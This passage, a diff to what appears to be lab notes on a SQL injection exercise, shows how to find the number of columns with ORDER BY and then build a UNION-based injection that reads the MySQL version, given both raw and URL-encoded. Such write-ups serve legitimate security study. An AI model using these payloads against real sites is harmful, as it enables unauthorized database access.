@@ -17,4 +17,16 @@
 '+ORDER+by+1%23%23
 ```
 - we got 200 we increase the value and we got 2 columns when we put 3 we get server error
-
+- now we want to figure out the columns type and we can deduce it from the site as it returns 2 texts one is the header and other is description
+- now to the union attack
+```
+SELECT @@version
+```
+- this is the payload for mysql db now we concat with the union attack
+```
+' UNION SELECT @@version , 'a' ##
+```
+- after url encoding it
+```
+'+UNION+SELECT+%40%40version+,+'a'+%23%23
+```
